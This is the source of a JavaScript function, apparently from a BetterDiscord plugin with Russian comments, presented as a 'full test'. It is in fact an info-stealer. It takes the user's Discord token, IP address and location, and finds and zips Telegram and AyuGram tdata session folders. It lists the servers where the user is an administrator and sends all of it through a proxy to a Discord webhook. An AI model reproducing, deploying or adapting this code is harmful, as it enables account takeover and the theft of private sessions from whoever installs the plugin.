async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
    let fs = null;
    let path = null;
    try { 
        fs = require('fs'); 
        path = require('path');
    } catch (e) { 
        return { success: false, error: "Модули fs/path недоступны." }; 
    }

    let zipFunc = null;
    if (fflate && typeof fflate.zipSync === 'function') zipFunc = fflate.zipSync;
    else if (fflate && fflate.default && typeof fflate.default.zipSync === 'function') zipFunc = fflate.default.zipSync;

    if (!zipFunc) {
        return { success: false, error: "Библиотека fflate не загружена." };
    }

    let result = { ip: null, location: null, nitro: "Нет", dtoken: null, telegram_path: null, debug_tdata: [], admin_servers: [] };
    
    // 1. IP и Локация (используем надежный HTTPS API)
    try {
        const ipRes = await BdApi.Net.fetch('https://ipinfo.io/json');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        result.location = ipData.city || ipData.region || ipData.country || "Неизвестно";
    } catch (e) {
        result.debug_tdata.push("Ошибка получения IP: " + e.message);
    }

    // 2. Nitro и Токен
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType > 0) result.nitro = "Nitro";
        }
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
    } catch (e) {}

    // 3. ПОИСК tdata (Telegram & AyuGram)
    let hasTdata = false;
    let tdataZipBuffer = null;
    try {
        let tdataPath = null;
        
        const appData = process.env.APPDATA || '';
        const localAppData = process.env.LOCALAPPDATA || '';
        const userProfile = process.env.USERPROFILE || '';
        
        result.debug_tdata.push(`APPDATA: ${appData || 'Пусто'}`);
        
        // Проверяем стандартные пути
        const possiblePaths = [
            path.join(appData, 'Telegram Desktop', 'tdata'),
            path.join(appData, 'Telegram', 'tdata'),
            path.join(appData, 'AyuGram', 'tdata'),
            path.join(localAppData, 'Telegram Desktop', 'tdata'),
            path.join(localAppData, 'Telegram', 'tdata'),
            path.join(localAppData, 'AyuGram', 'tdata'),
            path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'),
            path.join(userProfile, 'Desktop', 'AyuGram', 'tdata')
        ];

        for (const p of possiblePaths) {
            if (fs.existsSync(p)) {
                tdataPath = p;
                break;
            }
        }

        // Если не нашли, сканируем корни дисков (без глубокого погружения)
        if (!tdataPath) {
            result.debug_tdata.push("Стандартные пути пусты. Сканирование дисков...");
            const drives = ['C:', 'D:', 'E:', 'F:'];
            for (const d of drives) {
                try {
                    const root = d + '\\';
                    if (!fs.existsSync(root)) continue;
                    const dirs = fs.readdirSync(root);
                    for (const dir of dirs) {
                        const fullPath = path.join(root, dir);
                        if (fs.statSync(fullPath).isDirectory()) {
                            // Если папка называется tdata
                            if (dir.toLowerCase() === 'tdata') {
                                tdataPath = fullPath;
                                break;
                            }
                            // Или если внутри папки есть tdata (например, C:\Telegram\tdata)
                            try {
                                const subDirs = fs.readdirSync(fullPath);
                                for (const sub of subDirs) {
                                    if (sub.toLowerCase() === 'tdata') {
                                        tdataPath = path.join(fullPath, sub);
                                        break;
                                    }
                                }
                            } catch (e) {}
                        }
                        if (tdataPath) break;
                    }
                } catch (e) {}
                if (tdataPath) break;
            }
        }

        // Если нашли tdata - архивируем
        if (tdataPath) {
            result.telegram_path = tdataPath;
            result.debug_tdata.push(`Папка найдена: ${tdataPath}`);
            
            const files = {};
            const addFilesRecursively = (dir, prefix = '') => {
                try {
                    const entries = fs.readdirSync(dir);
                    for (const entry of entries) {
                        const fullPath = path.join(dir, entry);
                        const relativePath = path.join(prefix, entry);
                        try {
                            if (fs.statSync(fullPath).isDirectory()) addFilesRecursively(fullPath, relativePath);
                            else files[relativePath] = new Uint8Array(fs.readFileSync(fullPath));
                        } catch (fileErr) {}
                    }
                } catch (dirErr) {}
            };
            
            addFilesRecursively(tdataPath);
            result.debug_tdata.push(`Прочитано файлов: ${Object.keys(files).length}`);
            
            if (Object.keys(files).length > 0) {
                tdataZipBuffer = zipFunc(files);
                result.debug_tdata.push("ZIP успешно создан!");
                hasTdata = true;
            }
        } else {
            result.debug_tdata.push("Папка tdata не найдена нигде.");
        }
    } catch (e) {
        result.debug_tdata.push(`Критическая ошибка архивации: ${e.message}`);
    }

    // 4. Сбор информации о серверах
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') count = GuildMemberCountStore.getMemberCount(g.id);
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && result.dtoken) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, { headers: { "Authorization": result.dtoken } });
                            if (res.ok) { const data = await res.json(); count = data.approximate_member_count || data.member_count || 0; }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) {}

    // 5. Формируем сообщение и файлы (ОБЯЗАТЕЛЬНО указываем charset=utf-8)
    const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
    
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ content: messageText }));
    
    // Вот здесь мы чиним кракозябры
    const jsonString = JSON.stringify(result, null, 2);
    const jsonBlob = new Blob([jsonString], { type: 'application/json; charset=utf-8' });
    formData.append('files[0]', jsonBlob, 'data.json');
    
    if (tdataZipBuffer) {
        const zipBlob = new Blob([tdataZipBuffer], { type: 'application/zip' });
        formData.append('files[1]', zipBlob, 'tdata.zip');
    }

    // 6. Отправка
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, { method: 'POST', body: formData });
        if (!response.ok) {
            const errorText = await response.text();
            return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
        }
        return { success: true };
    } catch (e) {
        return { success: false, error: `Ошибка сети: ${e.message}` };
    }
}
